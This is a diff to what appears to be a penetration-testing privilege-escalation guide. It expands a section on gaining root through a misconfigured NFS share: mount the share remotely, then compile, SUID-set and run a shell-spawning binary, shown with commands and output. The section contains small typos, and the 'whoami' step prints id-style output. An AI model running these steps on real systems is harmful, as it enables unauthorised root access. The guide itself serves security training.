@@ -73,12 +73,35 @@ This was a privileged flag file in /root ! How did you read me!?!
 unprivuser@target-system:~$
 ```
 ## Mounted Filesystems with SetUID
-Is there perhaps a mounted NFS share that we can mount remotely? Maybe one with the mount options of setuid 0? 
+Is there perhaps a mounted NFS share that we can mount remotely? Maybe one with the mount options of setuid 0? We can check the compromised system with the following command,
+```
+user@target-machine:~$ dmesg | grep -i nfs
+[    3.705522] RPC: Registered tcp NFSv4.1 backchannel transport module.
+[    3.711126] FS-Cache: Netfs 'nfs' registered for caching
+[    3.721888] Installing knfsd (copyright (C) 1996 okir@monad.swb.de).
+[    3.961057] NFSD: Using /var/lib/nfs/v4recovery as the NFSv4 state recovery directory
+[    3.961244] NFSD: starting 90-second grace period (net c16580c0)
+```
+Next, we can verify the location of the NFS mount point on the target system by running the following command on the target system,
+```
+user@target-system:~$ /sbin/showmount -e (TARGET IP ADDRESS)
+Export list for (TARGET IP ADDRESS):
+/mnt/nfs/share (TARGET IP ADDRESS)/255.255.255.0
+```
+check the permissions of `/mnt/nfs/share` First, create a temporary mount point onthe Attacker machine and mount the remote NFS share like so,
 ```
 root@attacker-machine:~# mkdir /mnt/nfs
 root@attacker-machine:~# mount -t nfs (TARGET IP ADDRESS)/path/to/nfs /mnt/nfs -o nolock
 ```
-Then, compile a binary that spawns a shell, such as,
+Touch a file in the mount point and then check the file's permissions on the Target machine,
+```
+root@attacker-machine:~$ touch /mnt/nfs/file.txt
+```
+```
+user@target-machine:~$ ls -la /mnt/nfs/share
+-rw-r--r--  1 root root    0 Jan 30 13:41 file.txt
+```
+We see that the file was created a styhe root user. Now, we need to compile a binary that spawns a shell, set the SUID bit, and execute it on the target system.
 ```
 #include<stdlib.h>
 #include<stdio.h>
@@ -92,8 +115,15 @@ int main(void){
 ```
 Compile it so that the binary is on the mounted NFS share and run it,
 ```
-root@attacker-machine:/mnt/nfs:# gcc execute.c -m32 -o execute
+root@attacker-machine:/mnt/nfs# gcc execute.c -m32 -o execute
+root@attacker-machine:/mnt/nfs# chmod +s execute 
 ```
+```
+user@target-system:~$ /mnt/nfs/execute
+# whoami
+uid=1001(user) gid=1001(user) euid=0(root) egid=0(root) groups=0(root),1001(user)
+```
+Now, we have the effective user id, EUID, for execution of processes, as `root`.
 ## Cron Jobs
 Do any cron jobs run that execute scripts or binaries that we have write access to?
 ```
